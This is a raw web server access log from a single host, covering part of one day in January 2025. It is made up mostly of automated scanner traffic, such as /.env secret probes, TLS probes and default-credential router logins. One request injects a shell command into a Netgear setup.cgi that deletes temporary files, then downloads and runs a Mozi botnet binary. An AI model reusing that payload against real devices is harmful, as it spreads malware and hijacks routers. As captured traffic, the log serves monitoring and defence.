209.38.46.178 - - [09/Jan/2025:00:08:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
137.59.227.5 - - [09/Jan/2025:00:34:56 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.16.39.104 - - [09/Jan/2025:00:41:29 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.213.184.132 - - [09/Jan/2025:00:48:38 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
51.89.208.21 - - [09/Jan/2025:00:51:51 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.89.208.21 - - [09/Jan/2025:00:51:51 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
71.6.135.131 - - [09/Jan/2025:01:43:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
71.6.135.131 - - [09/Jan/2025:01:43:19 +0000] "GET /robots.txt HTTP/1.1" 302 331 "-" "-"
71.6.135.131 - - [09/Jan/2025:01:43:19 +0000] "GET /sitemap.xml HTTP/1.1" 302 331 "-" "-"
71.6.135.131 - - [09/Jan/2025:01:43:19 +0000] "GET /.well-known/security.txt HTTP/1.1" 302 331 "-" "-"
71.6.135.131 - - [09/Jan/2025:01:43:21 +0000] "GET /favicon.ico HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
45.230.66.5 - - [09/Jan/2025:02:17:41 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 302 350 "-" "-"
85.117.90.67 - - [09/Jan/2025:02:22:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
112.171.28.104 - - [09/Jan/2025:02:23:48 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [09/Jan/2025:02:24:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:02:24:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
152.42.219.47 - - [09/Jan/2025:02:27:29 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [09/Jan/2025:02:27:37 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
152.42.219.47 - - [09/Jan/2025:02:36:48 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [09/Jan/2025:02:36:59 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
159.223.67.34 - - [09/Jan/2025:02:41:46 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.67.34 - - [09/Jan/2025:02:41:55 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
159.223.69.51 - - [09/Jan/2025:02:42:31 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.69.51 - - [09/Jan/2025:02:42:40 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
4.151.38.168 - - [09/Jan/2025:02:51:27 +0000] "GET /manager/text/list HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.146 - - [09/Jan/2025:03:04:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.200.78.250 - - [09/Jan/2025:03:07:02 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [09/Jan/2025:03:25:21 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:03:25:21 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [09/Jan/2025:03:25:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
179.43.191.146 - - [09/Jan/2025:03:40:13 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.79.181.251 - - [09/Jan/2025:03:47:40 +0000] "\x16\x03\x01" 400 528 "-" "-"
193.34.212.75 - - [09/Jan/2025:03:52:25 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.19.138.234 - - [09/Jan/2025:03:55:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.3.223.55 - - [09/Jan/2025:04:05:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.202.9.133 - - [09/Jan/2025:04:08:25 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io)"
103.3.12.102 - - [09/Jan/2025:04:22:10 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
95.214.53.198 - - [09/Jan/2025:04:52:12 +0000] "GET / HTTP/1.1" 200 1761 "-" "-"
78.153.140.93 - - [09/Jan/2025:05:04:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:05:04:09 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
91.223.3.201 - - [09/Jan/2025:05:22:02 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.120.115.34 - - [09/Jan/2025:05:35:16 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0"
120.85.112.1 - - [09/Jan/2025:05:59:33 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 350 "-" "-"
119.203.57.181 - - [09/Jan/2025:06:07:31 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
119.203.57.181 - - [09/Jan/2025:06:07:33 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
119.203.57.181 - - [09/Jan/2025:06:07:55 +0000] "-" 408 0 "-" "-"
64.62.156.90 - - [09/Jan/2025:06:09:32 +0000] "\x16\x03\x01" 400 528 "-" "-"
80.82.77.202 - - [09/Jan/2025:06:15:29 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:06:17:52 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:06:17:52 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
74.82.47.5 - - [09/Jan/2025:06:18:59 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
74.82.47.5 - - [09/Jan/2025:06:21:47 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0"
74.82.47.5 - - [09/Jan/2025:06:22:24 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
185.16.39.104 - - [09/Jan/2025:06:23:05 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.193.202.85 - - [09/Jan/2025:06:45:10 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.1; en-US)"
193.34.212.75 - - [09/Jan/2025:06:49:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [09/Jan/2025:07:08:14 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:07:08:14 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.142.236.40 - - [09/Jan/2025:07:27:33 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.142.236.40 - - [09/Jan/2025:07:27:33 +0000] "GET /robots.txt HTTP/1.1" 302 331 "-" "-"
185.142.236.40 - - [09/Jan/2025:07:27:33 +0000] "GET /sitemap.xml HTTP/1.1" 302 331 "-" "-"
185.142.236.40 - - [09/Jan/2025:07:27:34 +0000] "GET /.well-known/security.txt HTTP/1.1" 302 331 "-" "-"
185.142.236.40 - - [09/Jan/2025:07:27:35 +0000] "GET /favicon.ico HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
112.163.202.170 - - [09/Jan/2025:07:34:51 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
18.118.133.247 - - [09/Jan/2025:07:39:43 +0000] "\x16\x03\x01" 400 528 "-" "-"
18.118.133.247 - - [09/Jan/2025:07:39:55 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
87.120.112.187 - - [09/Jan/2025:07:44:29 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G955F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"
59.4.13.146 - - [09/Jan/2025:07:49:50 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
45.79.181.104 - - [09/Jan/2025:07:50:43 +0000] "\x16\x03\x01" 400 528 "-" "-"
87.121.79.3 - - [09/Jan/2025:08:21:18 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.94.146.49 - - [09/Jan/2025:08:25:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.146.49 - - [09/Jan/2025:08:25:16 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.49 - - [09/Jan/2025:08:25:16 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.49 - - [09/Jan/2025:08:25:16 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.49 - - [09/Jan/2025:08:25:16 +0000] "PRI * HTTP/2.0" 400 528 "-" "-"
87.121.79.3 - - [09/Jan/2025:08:31:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.45.154.125 - - [09/Jan/2025:08:39:46 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
199.45.154.125 - - [09/Jan/2025:08:39:50 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.125 - - [09/Jan/2025:08:39:50 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.125 - - [09/Jan/2025:08:39:51 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.125 - - [09/Jan/2025:08:39:51 +0000] "PRI * HTTP/2.0" 400 528 "-" "-"
208.40.4.107 - - [09/Jan/2025:08:50:04 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
46.19.138.234 - - [09/Jan/2025:08:57:16 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
159.223.205.208 - - [09/Jan/2025:08:58:20 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.113 Safari/537.36 Vivaldi/2.1.1337.51"
179.43.191.146 - - [09/Jan/2025:09:44:34 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.196.220.253 - - [09/Jan/2025:09:50:14 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.93 - - [09/Jan/2025:09:53:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:09:53:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
89.248.171.23 - - [09/Jan/2025:09:56:38 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [09/Jan/2025:09:56:38 +0000] "GET /css/login.css HTTP/1.1" 200 644 "http://34.89.130.92/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [09/Jan/2025:09:56:38 +0000] "GET /js/brand.js HTTP/1.1" 200 570 "http://34.89.130.92/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [09/Jan/2025:09:56:38 +0000] "GET /js/login.js HTTP/1.1" 200 922 "http://34.89.130.92/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [09/Jan/2025:09:56:38 +0000] "GET /js/utils/json-manipulator.js HTTP/1.1" 200 564 "http://34.89.130.92/js/brand.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [09/Jan/2025:09:56:38 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 1344 "http://34.89.130.92/js/login.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [09/Jan/2025:09:56:38 +0000] "GET /config/brand.json HTTP/1.1" 200 366 "http://34.89.130.92/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [09/Jan/2025:09:56:38 +0000] "GET /brands/Hikvision.png HTTP/1.1" 200 328878 "http://34.89.130.92/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
80.82.70.198 - - [09/Jan/2025:09:56:50 +0000] "GET /favicon.ico HTTP/1.1" 302 273 "http://34.89.130.92/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
94.102.49.123 - - [09/Jan/2025:09:56:50 +0000] "GET / HTTP/1.1" 200 889 "http://34.89.130.92/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
195.3.223.55 - - [09/Jan/2025:10:14:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.91.127.81 - - [09/Jan/2025:10:16:07 +0000] "CONNECT api.ip.pn:443 HTTP/1.1" 302 350 "-" "Mozilla/5.0"
218.156.62.215 - - [09/Jan/2025:10:16:34 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
45.140.17.52 - - [09/Jan/2025:10:19:00 +0000] "\x03" 400 528 "-" "-"
193.34.212.75 - - [09/Jan/2025:10:22:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
87.120.125.126 - - [09/Jan/2025:10:30:37 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
205.210.31.5 - - [09/Jan/2025:10:36:00 +0000] "\x16\x03\x01" 400 528 "-" "-"
205.210.31.5 - - [09/Jan/2025:10:36:00 +0000] "\x16\x03\x01" 400 528 "-" "-"
198.235.24.105 - - [09/Jan/2025:10:38:53 +0000] "\x16\x03\x01" 400 528 "-" "-"
198.235.24.105 - - [09/Jan/2025:10:38:53 +0000] "\x16\x03\x01" 400 528 "-" "-"
87.120.117.61 - - [09/Jan/2025:11:01:54 +0000] "HEAD / HTTP/1.1" 200 296 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
87.120.117.61 - - [09/Jan/2025:11:01:55 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
87.120.117.61 - - [09/Jan/2025:11:01:56 +0000] "POST / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
87.120.127.198 - - [09/Jan/2025:11:05:52 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13"
175.205.1.49 - - [09/Jan/2025:11:12:47 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
172.105.128.12 - - [09/Jan/2025:11:46:22 +0000] "\x16\x03\x01" 400 528 "-" "-"
82.58.106.128 - - [09/Jan/2025:11:47:38 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
80.82.77.202 - - [09/Jan/2025:11:49:00 +0000] "\x16\x03\x02\x01o\x01" 400 528 "-" "-"
185.16.39.104 - - [09/Jan/2025:11:51:11 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.223.3.201 - - [09/Jan/2025:12:12:51 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [09/Jan/2025:13:09:32 +0000] "\x16\x03\x02\x01o\x01" 400 528 "-" "-"
147.185.133.151 - - [09/Jan/2025:13:11:56 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
154.213.184.23 - - [09/Jan/2025:13:19:30 +0000] "CONNECT web.realsysadm.in:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
78.153.140.93 - - [09/Jan/2025:13:20:29 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:13:20:29 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.206.141.63 - - [09/Jan/2025:13:36:57 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
148.153.45.238 - - [09/Jan/2025:13:49:22 +0000] "GET /IqIY HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [09/Jan/2025:13:49:22 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/IqIY" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [09/Jan/2025:13:49:22 +0000] "GET /ZlUB HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [09/Jan/2025:13:49:24 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/ZlUB" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [09/Jan/2025:13:49:24 +0000] "GET /aab8 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [09/Jan/2025:13:49:25 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/aab8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [09/Jan/2025:13:49:25 +0000] "GET /aab9 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [09/Jan/2025:13:49:26 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/aab9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
154.213.184.132 - - [09/Jan/2025:13:52:49 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
93.174.93.12 - - [09/Jan/2025:14:00:48 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 4.3; SPH-L710 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
193.34.212.75 - - [09/Jan/2025:14:05:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
103.253.154.142 - - [09/Jan/2025:14:26:52 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
195.3.223.55 - - [09/Jan/2025:14:54:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.140.17.52 - - [09/Jan/2025:15:09:24 +0000] "\x03" 400 528 "-" "-"
185.196.220.253 - - [09/Jan/2025:15:11:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
45.83.65.11 - - [09/Jan/2025:15:18:20 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
45.83.66.205 - - [09/Jan/2025:15:18:20 +0000] "GET /favicon.ico HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
45.83.66.205 - - [09/Jan/2025:15:18:20 +0000] "GET / HTTP/1.1" 200 1002 "http://34.89.130.92:80/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
59.2.28.171 - - [09/Jan/2025:15:36:00 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [09/Jan/2025:15:38:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:15:38:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
13.87.245.145 - - [09/Jan/2025:15:57:07 +0000] "MGLNDD_34.89.130.92_80\n" 400 528 "-" "-"
